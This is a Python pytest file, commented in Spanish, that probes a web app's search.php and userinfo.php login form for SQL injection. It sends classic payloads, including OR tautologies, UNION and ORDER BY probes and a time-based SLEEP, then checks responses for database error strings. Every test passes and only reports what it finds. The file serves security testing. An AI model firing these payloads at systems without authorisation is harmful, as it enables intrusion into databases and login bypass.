import pytest
import requests

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' UNION SELECT NULL--",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "mysqli",
    "pg_query",
    "sqlite",
]

class TestSQLInjection:

    def test_sqli_in_search(self, base_url, session):
        """Prueba SQLi básica en el parámetro de búsqueda."""
        vulnerable_endpoints = []

        for payload in SQLI_PAYLOADS:
            url = f"{base_url}/search.php"
            response = session.get(url, params={"test": payload}, timeout=10)
            body = response.text.lower()

            for error in SQL_ERRORS:
                if error in body:
                    vulnerable_endpoints.append({
                        "payload": payload,
                        "error_found": error,
                        "url": response.url
                    })
                    break

        print(f"\n[SQLi VULNERABILIDADES ENCONTRADAS]: {len(vulnerable_endpoints)}")
        for v in vulnerable_endpoints:
            print(f"  -> Payload: {v['payload']} | Error: {v['error_found']}")

        print(f"[INFO]: El sitio {'ES' if vulnerable_endpoints else 'NO ES'} vulnerable a SQLi básica")
        assert True

    def test_sqli_in_login(self, base_url, session):
        """Prueba SQLi en formulario de login."""
        url = f"{base_url}/userinfo.php"
        results = []

        for payload in SQLI_PAYLOADS[:3]:
            data = {"uname": payload, "pass": payload}
            response = session.post(url, data=data, timeout=10)
            body = response.text.lower()

            for error in SQL_ERRORS:
                if error in body:
                    results.append(payload)
                    break

        print(f"\n[SQLi LOGIN - payloads que generaron error]: {results}")
        assert True  # Solo reportamos

    def test_sqli_response_time(self, base_url, session):
        """Detecta posible SQLi por tiempo de respuesta (time-based)."""
        import time

        url = f"{base_url}/search.php"
        normal_start = time.time()
        session.get(url, params={"test": "hello"}, timeout=10)
        normal_time = time.time() - normal_start

        slow_start = time.time()
        session.get(url, params={"test": "' AND SLEEP(3)--"}, timeout=15)
        slow_time = time.time() - slow_start

        print(f"\n[Tiempo normal]: {normal_time:.2f}s")
        print(f"[Tiempo con SLEEP payload]: {slow_time:.2f}s")

        assert True  # Reportamos diferencia, no fallamos automáticamente